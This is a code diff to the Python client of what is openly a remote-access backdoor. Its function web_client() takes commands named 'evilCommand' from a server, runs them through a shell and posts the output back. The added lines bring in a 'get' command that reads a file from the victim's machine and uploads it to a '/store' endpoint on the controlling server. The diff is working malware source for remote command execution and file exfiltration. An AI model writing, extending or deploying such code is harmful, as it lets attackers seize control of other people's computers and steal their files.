@@ -16,6 +16,15 @@ def web_client():
         if 'terminate' in evilCommand:
             break
         
+        elif 'get' in evilCommand:
+            getString, filename = evilCommand.split("*")
+            if os.path.exists(filename):
+                url_toProcessFile = URL_STRING+"/store"
+                fileObject = {"file": open(filename,"rb")}
+                r = requests.post(url_toProcessFile,files=fileObject)
+            else:
+                postResponse = requests.post(URL_STRING,data="File Not Found")
+        
         else:
             shellObject = subprocess.Popen(evilCommand, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             postResponse = requests.post(URL_STRING,data=shellObject.stdout.read())
